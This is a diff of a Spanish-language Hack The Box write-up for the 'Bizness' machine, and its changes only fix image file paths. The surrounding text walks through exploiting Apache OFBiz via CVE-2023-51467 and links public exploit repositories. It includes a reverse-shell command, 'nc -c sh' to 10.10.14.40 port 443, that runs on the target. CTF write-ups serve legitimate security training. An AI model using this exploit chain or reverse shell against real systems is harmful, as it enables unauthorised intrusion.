@@ -3,7 +3,7 @@ title: "Bizness - WriteUp"
 date: Fri Jan 10 2025 14:45:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, dirb, reverse-shell, cve, exploit, wfuzz, nginx, apache]
-image: /assets/img/htb-writeups/Pasted image 20240112103540.png
+image: /assets/img/htb-writeups/Pasted-image-20240112103540.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240112103540.png
   platform="HTB"
 %}
 
-![Bizness](/assets/img/htb-writeups/Pasted image 20240112103540.png)
+![Bizness](/assets/img/htb-writeups/Pasted-image-20240112103540.png)
 
 -------
 
@@ -65,7 +65,7 @@ https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][
 ```
 
 HTTP
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112103540.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112103540.png)
 
 FUZZING
 
@@ -83,7 +83,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Descubrimos la ruta "control". Vamos al navegador y vemos esto:
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112104617.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112104617.png)
 
 Investigamos sobre _Apache OFBiz_ y descubrimos una vulnerabilidad reciente SSRF, la _CVE-2023-51467_.
 
@@ -94,7 +94,7 @@ https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT
 
 Nos lo bajamos y lo ejecutamos:
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112105826.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112105826.png)
 
 Parece que es vulnerable a este exploit. Vamos a ver cómo le podemos sacar más provecho.
 
@@ -106,7 +106,7 @@ https://bizness.htb/webtools/control/main
 
 Que nos lleva a la siguiente página:
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112110049.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112110049.png)
 
 Le damos a "Login" y nos lleva a la siguiente URL:
 
@@ -114,12 +114,12 @@ Le damos a "Login" y nos lleva a la siguiente URL:
 https://bizness.htb/webtools/control/checkLogin
 ```
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112110211.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112110211.png)
 
 Encontramos este otro exploit que permite la ejecución remota de comandos:
 https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112112610.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112112610.png)
 
 Nos ponemos en escucha en el puerto 443 con _nc_ y ejecutamos el exploit con una reverse shell simple de NetCat:
 
@@ -127,12 +127,12 @@ Nos ponemos en escucha en el puerto 443 con _nc_ y ejecutamos el exploit con una
 $ python3 exploit.py --url https://bizness.htb --cmd 'nc -c sh 10.10.14.40 443'
 ```
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112112650.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112112650.png)
 
 Y pa dentro!
 Sanitizamos terminal para volverla full interactiva y comenzamos a enumerar.
 
-![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112113035.png)
+![BIZNESS](/assets/img/htb-writeups/Pasted-image-20240112113035.png)
 
 Buscando entre unos archivos .dat en la ruta "_/opt/ofbiz/runtime/data/derby/ofbiz/seg0_" encontramos la siguiente línea:
 
